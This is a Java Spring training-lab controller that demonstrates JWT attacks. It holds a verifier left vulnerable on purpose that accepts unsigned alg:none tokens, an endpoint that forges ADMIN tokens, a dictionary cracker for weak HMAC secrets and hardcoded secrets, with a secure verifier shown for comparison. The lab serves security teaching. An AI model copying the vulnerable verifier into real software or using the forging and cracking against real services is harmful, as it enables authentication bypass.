package com.example.apisecurity.lab;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * TRAINING LAB - JWT attacks. Deliberately-weak verification; local training
 * only. Uses hand-rolled HS256 (JDK HMAC) so we can demonstrate genuinely weak
 * (short, guessable) signing keys, which a hardened JOSE library would refuse.
 *
 *   POST /api/lab/jwt/issue-weak       {subject}        -> HS256 token signed with a WEAK secret
 *   POST /api/lab/jwt/forge-alg-none   {subject,role}   -> attacker tool: unsigned {"alg":"none"} token
 *   POST /api/lab/jwt/verify-insecure  {token}          -> VULNERABLE (trusts alg:none, trusts header)
 *   POST /api/lab/jwt/verify-secure    {token}          -> SAFE (rejects none; verifies HS256)
 *   POST /api/lab/jwt/crack            {token}          -> dictionary attack recovering a weak secret
 */
@RestController
@RequestMapping("/api/lab/jwt")
public class JwtAttackLabController {

    // The server's "real" HS256 secret for the secure verifier. Strong.
    private static final String SERVER_SECRET = "a-strong-server-secret-that-is-long-enough-32B+";

    // The deliberately weak secret used by issue-weak (short & guessable).
    private static final String WEAK_SECRET = "secret";

    // A tiny password list for the offline HMAC brute-force demo.
    private static final List<String> DICTIONARY = List.of(
            "123456", "password", "admin", "letmein", "changeit", "qwerty",
            "secret", "jwt", "token", "s3cr3t", "test");

    private static final Base64.Encoder B64 = Base64.getUrlEncoder().withoutPadding();
    private static final Base64.Decoder B64D = Base64.getUrlDecoder();

    public record SubjectRequest(String subject, String role) {
    }

    public record TokenRequest(String token) {
    }

    // --- token construction ---------------------------------------------------

    @PostMapping("/issue-weak")
    public Map<String, Object> issueWeak(@RequestBody SubjectRequest req) {
        String sub = req.subject() == null ? "alice" : req.subject();
        String header = "{\"alg\":\"HS256\",\"typ\":\"JWT\"}";
        String payload = "{\"sub\":\"" + sub + "\",\"role\":\"USER\"}";
        String signingInput = B64.encodeToString(header.getBytes(StandardCharsets.UTF_8))
                + "." + B64.encodeToString(payload.getBytes(StandardCharsets.UTF_8));
        String jwt = signingInput + "." + hmac256(signingInput, WEAK_SECRET);
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("jwt", jwt);
        out.put("note", "Signed with a WEAK secret. Recover it at POST /api/lab/jwt/crack.");
        return out;
    }

    /**
     * Attacker tool: produce an UNSIGNED token with {"alg":"none"} and any
     * claims you like (e.g. role=ADMIN). A correct verifier must reject it; the
     * insecure one below accepts it.
     */
    @PostMapping("/forge-alg-none")
    public Map<String, Object> forgeAlgNone(@RequestBody SubjectRequest req) {
        String sub = req.subject() == null ? "attacker" : req.subject();
        String role = req.role() == null ? "ADMIN" : req.role();
        String header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
        String payload = "{\"sub\":\"" + sub + "\",\"role\":\"" + role + "\"}";
        String jwt = B64.encodeToString(header.getBytes(StandardCharsets.UTF_8))
                + "." + B64.encodeToString(payload.getBytes(StandardCharsets.UTF_8)) + ".";
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("jwt", jwt);
        out.put("note", "Unsigned alg:none token. Feed it to verify-insecure (accepted) vs verify-secure (rejected).");
        return out;
    }

    // --- verification (vulnerable vs safe) ------------------------------------

    /**
     * VULNERABLE: trusts the {@code alg} header. If it says "none", the token is
     * accepted with no signature at all - so a forged alg:none token logs in as
     * whatever it claims.
     */
    @PostMapping("/verify-insecure")
    public ResponseEntity<Object> verifyInsecure(@RequestBody TokenRequest req) {
        String[] parts = req.token().split("\\.", -1);
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("mode", "VULNERABLE (honors alg:none, trusts header)");
        try {
            String header = new String(B64D.decode(parts[0]), StandardCharsets.UTF_8);
            String payload = new String(B64D.decode(parts[1]), StandardCharsets.UTF_8);
            if (header.contains("\"none\"")) {
                out.put("accepted", true);
                out.put("claims", payload);
                out.put("why", "alg=none was accepted WITHOUT any signature check");
                return ResponseEntity.ok(out);
            }
            // HS256 path: verifies against the server secret.
            boolean ok = parts.length == 3
                    && hmac256(parts[0] + "." + parts[1], SERVER_SECRET).equals(parts[2]);
            out.put("accepted", ok);
            out.put("claims", ok ? payload : null);
            return ResponseEntity.ok(out);
        } catch (Exception e) {
            out.put("accepted", false);
            out.put("error", e.getMessage());
            return ResponseEntity.badRequest().body(out);
        }
    }

    /** SAFE: alg:none is rejected outright; only a valid HS256 signature passes. */
    @PostMapping("/verify-secure")
    public ResponseEntity<Object> verifySecure(@RequestBody TokenRequest req) {
        String[] parts = req.token().split("\\.", -1);
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("mode", "SAFE (alg:none rejected; HS256 signature required)");
        try {
            String header = new String(B64D.decode(parts[0]), StandardCharsets.UTF_8);
            if (!header.contains("\"HS256\"")) {
                out.put("accepted", false);
                out.put("error", "unsupported or missing alg (only HS256 allowed)");
                return ResponseEntity.status(401).body(out);
            }
            boolean ok = parts.length == 3 && !parts[2].isEmpty()
                    && hmac256(parts[0] + "." + parts[1], SERVER_SECRET).equals(parts[2]);
            out.put("accepted", ok);
            if (!ok) {
                out.put("error", "signature verification failed");
                return ResponseEntity.status(401).body(out);
            }
            out.put("claims", new String(B64D.decode(parts[1]), StandardCharsets.UTF_8));
            return ResponseEntity.ok(out);
        } catch (Exception e) {
            out.put("accepted", false);
            out.put("error", e.getMessage());
            return ResponseEntity.badRequest().body(out);
        }
    }

    // --- offline brute force --------------------------------------------------

    /**
     * Offline dictionary attack: try each candidate secret and see whether it
     * reproduces the token's signature. A weak/guessable HMAC secret is
     * recovered, after which the attacker can forge arbitrary valid tokens.
     */
    @PostMapping("/crack")
    public Map<String, Object> crack(@RequestBody TokenRequest req) {
        String[] parts = req.token().split("\\.", -1);
        Map<String, Object> out = new LinkedHashMap<>();
        if (parts.length != 3 || parts[2].isEmpty()) {
            out.put("cracked", false);
            out.put("error", "not an HS256-signed JWT");
            return out;
        }
        String signingInput = parts[0] + "." + parts[1];
        for (String candidate : DICTIONARY) {
            if (hmac256(signingInput, candidate).equals(parts[2])) {
                out.put("cracked", true);
                out.put("secret", candidate);
                out.put("triedCandidates", DICTIONARY.size());
                out.put("impact", "With the secret known, an attacker can forge any valid token.");
                return out;
            }
        }
        out.put("cracked", false);
        out.put("triedCandidates", DICTIONARY.size());
        return out;
    }

    private static String hmac256(String data, String secret) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), "HmacSHA256"));
            return B64.encodeToString(mac.doFinal(data.getBytes(StandardCharsets.UTF_8)));
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
    }
}
